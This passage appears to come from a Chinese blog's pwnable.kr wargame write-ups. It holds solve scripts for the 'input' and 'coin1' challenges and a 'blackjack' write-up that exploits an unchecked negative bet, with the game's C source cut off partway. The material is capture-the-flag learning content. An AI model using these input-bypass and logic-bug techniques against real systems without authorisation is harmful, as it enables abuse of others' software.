<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// here&#x27;s your flag</span></span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    该题是一个综合的input题，有五关，达成五次验证即可成功cat flag，这里单纯使用python来完成题目，主要用到了subprocess模块及其中的Popen类，阅读一下subprocess.py的源码，可以知道Popen主要是用来构建一个子进程并为其设置如下一些启动选项，内部原理还是fork了一个子进程，而这些选项可以完美覆盖本题，所以选用更方便的python写exp：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210827164012.png"></p>
<ol>
<li><p>参数相关，输入100个参数，其中0x41和0x42个参数需要自己构造为对应的值</p>
</li>
<li><p>文件描述符相关，fd为0表示stdin，fd为2表示stderr，题目意思是先从stdin流中读取四个字节到buf，之后又从stderr流中读取四个字节到buf。可以通过创建子进程修改stdin和stderr的方式来完成绕过。</p>
</li>
<li><p>环境变量env相关，我们需要构造一个环境变量，来保证getenv()读取出来的是指定的字符串。分析到这里是已经知道可以通过参数env来传递需要设置的环境变量，但是第一次使用，不知道env对应的参数以什么格式传递。然后我去继续阅读了源码，发现Popen最终是通过os.execvpe()来传递对应的env进行子程序执行的，对os.exec系列函数进行查资料分析，发现这里环境变量对应的配置参数env必须是一个mapping对象，所以用dict即可(ps:使用过程中发现直接给env填写一个值，看报错信息也是一个方法。。。)。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210827165722.png"></p>
</li>
<li><p>文件相关，读取指定的”\x0a”文件，且前四个字节为”\x00\x00\x00\x00”。这个我们自己造一个对应的文件填充内容即可。</p>
</li>
<li><p>网络相关，标准的套接字创建并接收流程。服务端绑定的端口通过argv[‘C’]传入，是可控的，我们只需要对localhost和对应的端口发起请求，send对应数据即可。</p>
</li>
</ol>
<p>最终构造的完整exp代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os,socket,time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="comment">#argv</span></span><br><span class="line">	argv=<span class="built_in">list</span>(<span class="string">&#x27;A&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">	argv[<span class="number">0</span>]=<span class="string">&quot;./input&quot;</span></span><br><span class="line">	argv[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)]=<span class="string">&quot;&quot;</span></span><br><span class="line">	argv[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)]=<span class="string">&quot;\x20\x0a\x0d&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#stdin</span></span><br><span class="line">	r_i,w_i = os.pipe()</span><br><span class="line">	r_e,w_e = os.pipe()</span><br><span class="line">	os.write(w_i,<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>)</span><br><span class="line">	os.write(w_e,<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">#env</span></span><br><span class="line">	env=&#123;<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>:<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">#file</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		f=<span class="built_in">open</span>(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		print(<span class="string">&quot;create file \x0a falid&quot;</span>)</span><br><span class="line">	f.write(<span class="string">&quot;\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	argv[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]=<span class="string">b&#x27;5555&#x27;</span></span><br><span class="line">	</span><br><span class="line">	subprocess.Popen(argv,stdin=r_i,stderr=r_e,env=env)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#network</span></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	s=socket.socket()</span><br><span class="line">	s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">5555</span>))</span><br><span class="line">	s.send(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>本地验证可以成功cat flag： <img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210827235440.png"></p>
<p> 下面就需要ssh链接后进心操作，我们通过scp，将exp文件(修改argv[0]对应input路径)上传到服务器中的tmp/imput/目录下(先ssh链接进入tmp下创建input目录，创建新目录是因为没有权限)，然后通过软链接把flag拷贝一份到tmp/input/下来使得可以cat flag：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -P2222 ./input-local.py input2@pwnable.kr:/tmp/input/exp.py</span><br><span class="line"><span class="comment">#-P  大写</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210828002531.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之11-coin1</title>
    <url>/2021/09/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9711-coin1/</url>
    <content><![CDATA[<p> 本道提示让我们通过nc命令链接，所以直接连上去看看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210915100528.png"></p>
<p>  题目大概意思是：现在手里拿着一些金币，其中一个是假币，假币和真币外观一摸一样，但是重量不同，真币重10假币重9，然后我们找到100枚假币才会得到flag。我们会获得一些硬币(N)，然后设定规则对某一组硬币称重，在有限的C次机会内找到假币。最终需要在60s内完成游戏100次，即找到100枚假币来完成游戏。</p>
<p><strong>分析：</strong></p>
<p>题目是一个和漏洞关系不大的coding题目,主要是二分法查找，还是做一下吧，这里记得先随便用个之前的题目ssh登录到服务器在解题比较好，因为这玩意儿要完成100次，网速不稳定就会在中间某次请求超时失败，所以登录服务器本地做题。比如使用前面的inpu2题目登录，在/tmp/下新建coin目录(得新建目录才可以)，然后再coin/下写代码并执行即可。</p>
<p>写好的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=socket.socket()</span><br><span class="line"><span class="comment">#s.connect((&quot;pwnable.kr&quot;,9007))</span></span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9007</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetNumbers</span>(<span class="params">begin,end</span>):</span></span><br><span class="line">	numList=[]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(begin,end):</span><br><span class="line">		numList.append(<span class="built_in">str</span>(i))</span><br><span class="line">	<span class="comment">#print &quot; &quot;.join(numList)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(numList)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StartGame</span>(<span class="params">num,count</span>):</span></span><br><span class="line">	fr=(<span class="number">0</span>,num/<span class="number">2</span>)</span><br><span class="line">	sr=(num/<span class="number">2</span>,num)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count+<span class="number">1</span>):</span><br><span class="line">		s.send(GetNumbers(fr[<span class="number">0</span>],fr[<span class="number">1</span>])+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">		data=s.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line">		<span class="keyword">if</span>(re.match(<span class="string">r&quot;^\d+$&quot;</span>,<span class="built_in">str</span>(data))):</span><br><span class="line">			weigh=<span class="built_in">int</span>(data)</span><br><span class="line">			<span class="keyword">if</span>(weigh%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">				fr=(sr[<span class="number">0</span>],(sr[<span class="number">0</span>]+sr[<span class="number">1</span>])/<span class="number">2</span>+(sr[<span class="number">0</span>]+sr[<span class="number">1</span>])%<span class="number">2</span>)</span><br><span class="line">				sr=(fr[<span class="number">1</span>],sr[<span class="number">1</span>])</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				fr=(fr[<span class="number">0</span>],(fr[<span class="number">0</span>]+fr[<span class="number">1</span>])/<span class="number">2</span>+(fr[<span class="number">0</span>]+fr[<span class="number">1</span>])%<span class="number">2</span>)</span><br><span class="line">				sr=(fr[<span class="number">1</span>],sr[<span class="number">0</span>])</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span> s.recv(<span class="number">1024</span>*<span class="number">2</span>)	</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		data=s.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="keyword">if</span>(re.match(<span class="string">r&quot;^N=(\d+) C=(\d+)$&quot;</span>,<span class="built_in">str</span>(data))):</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line">			num=<span class="built_in">int</span>(data.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">			count=<span class="built_in">int</span>(data.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">			StartGame(num,count)</span><br><span class="line">		<span class="keyword">elif</span>(re.match(<span class="string">r&quot;^Correct!$&quot;</span>,<span class="built_in">str</span>(data))):</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">elif</span>(<span class="string">&quot;format error&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data) <span class="keyword">or</span> <span class="string">&quot;time expired! bye!&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data)):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	s.close()</span><br></pre></td></tr></table></figure>

<p>执行后，成功得到flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210915194900.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之12-blackjack</title>
    <url>/2021/09/17/pwnable/pwnable.kr%E7%B3%BB%E5%88%9712-blackjack/</url>
    <content><![CDATA[<p>题目是一个游戏blackjack(我们叫做21点)，获取flag条件就是赢成百万富翁</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165031.png"></p>
<p>连上去看，就是玩游戏，还有游戏说明之类的，游戏起始资金$500，不知道是不是伪随机，反正靠运气赢到100w就是在做梦了。</p>
<p>游戏提示界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165429.png"></p>
<p>游戏开始界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165519.png"></p>
<p><strong>分析：</strong></p>
<p>​    这游戏就是找漏洞，源码已经给了，在<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html">源码链接</a>处，不过好像挂了，搜索了一番，找到别人贴的源码，我在文章末尾也放了一份备份。</p>
<p>先玩几把游戏，熟悉一下流程，发现没啥思路，那还是直接去读代码吧，漏洞点肯定是和赢钱和输钱的处理有关，因为我们这里也就bet这一个输入点。游戏是一个简单的命令行程序，逻辑倒不复杂，直接去paly()中分析，cash是总钱数，bet是每次赌的钱数，这里程序处理逻辑有个明显的漏洞也就是对于bet他没有限制正负只限制了正数的大小，然后输赢都是简单的把bet加减到cash中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917171040.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917170912.png"></p>
<p>要知道用户是不稳定的，你并不知道其会做出什么操作或者输入什么东西，所以对于用户的输入需要考虑到所有的情况然后过滤。那这里的漏洞利用方式也就很明显了，直接押注-1000000就可以了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917171456.png"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Programmer: Vladislav Shulman</span></span><br><span class="line"><span class="comment">// Final Project</span></span><br><span class="line"><span class="comment">// Blackjack</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Feel free to use any and all parts of this program and claim it as your own work</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//FINAL DRAFT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;                //Used for srand((unsigned) time(NULL)) command</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;             //Used for system(&quot;clear&quot;) command</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spade 06                 <span class="comment">//Used to print spade symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> club 05                  <span class="comment">//Used to print club symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> diamond 04               <span class="comment">//Used to print diamond symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heart 03                 <span class="comment">//Used to print heart symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESULTS <span class="meta-string">&quot;Blackjack.txt&quot;</span>  <span class="comment">//File name is Blackjack</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Global Variables</span></span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> won;</span><br><span class="line"><span class="keyword">int</span> loss;</span><br><span class="line"><span class="keyword">int</span> cash = <span class="number">500</span>;</span><br><span class="line"><span class="keyword">int</span> bet;</span><br><span class="line"><span class="keyword">int</span> random_card;</span><br><span class="line"><span class="keyword">int</span> player_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> dealer_total;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Function Prototypes</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span></span>;      <span class="comment">//Displays Club Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span></span>;   <span class="comment">//Displays Diamond Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span></span>;     <span class="comment">//Displays Heart Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span></span>;     <span class="comment">//Displays Spade Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span></span>;      <span class="comment">//Generates random card</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span></span>;       <span class="comment">//Asks user amount to bet</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span></span>;     <span class="comment">//Asks user to continue</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span></span>;        <span class="comment">//Prints &quot;Rules of Vlad&#x27;s Blackjack&quot; menu</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>;         <span class="comment">//Plays game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span></span>;       <span class="comment">//Function to play for dealer AI</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span></span>;         <span class="comment">//Function for when user selects &#x27;Stay&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span></span>;    <span class="comment">//Test for if user has cash remaining in purse</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span></span>;      <span class="comment">//Asks if user wants to continue playing</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span></span>;  <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Main Function</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n              222                111                            &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n            222 222            11111                              &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n           222   222          11 111                            &quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n                222              111                               &quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n               222               111                           &quot;</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                &quot;</span>, club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              &quot;</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c    %c    %c%c          %c    %c     %c          %c  %c               &quot;</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              &quot;</span>, club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             &quot;</span>, club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c     %c   %c%c         %c      %c    %c          %c   %c               &quot;</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                                         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             &quot;</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            &quot;</span>, club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n                        21                                   &quot;</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                &quot;</span>, diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c        %c  %c       %c     %c   %c   %c              &quot;</span>, diamond, diamond, heart, heart, club, club, spade, spade);                                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c       %c    %c     %c          %c  %c               &quot;</span>, diamond, diamond, heart, heart, club, spade, spade);                                           </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c       %c %c%c %c     %c          %c %c              &quot;</span>, diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             &quot;</span>, diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c      %c      %c    %c          %c   %c               &quot;</span>, diamond, diamond, heart, heart, club, spade, spade);                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n     %c  %c%c     %c        %c    %c     %c   %c    %c             &quot;</span>, diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            &quot;</span>, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n         222                     111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        222                      111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n       222                       111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n      222222222222222      111111111111111                       &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n      2222222222222222    11111111111111111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">     </span><br><span class="line">    asktitle();</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//end program</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to continue</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">    <span class="keyword">int</span> choice2;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                 Are You Ready?&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                ----------------&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                      (Y/N)\n                        &quot;</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">&#x27;Y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;N&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Choice. Please Enter Y for Yes or N for No.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">&#x27;Y&#x27;</span>) || (choice1 == <span class="string">&#x27;y&#x27;</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nEnter 1 to Begin the Greatest Game Ever Played.&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nEnter 2 to See a Complete Listing of Rules.&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nEnter 3 to Exit Game. (Not Recommended)&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nChoice: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice2); <span class="comment">// Prompts user for choice</span></span><br><span class="line">            <span class="keyword">if</span>((choice2&lt;<span class="number">1</span>) || (choice2&gt;<span class="number">3</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nIncorrect Choice. Please enter 1, 2 or 3\n&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(choice2) <span class="comment">// Switch case for different choices</span></span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Case to begin game</span></span><br><span class="line">                   system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">                    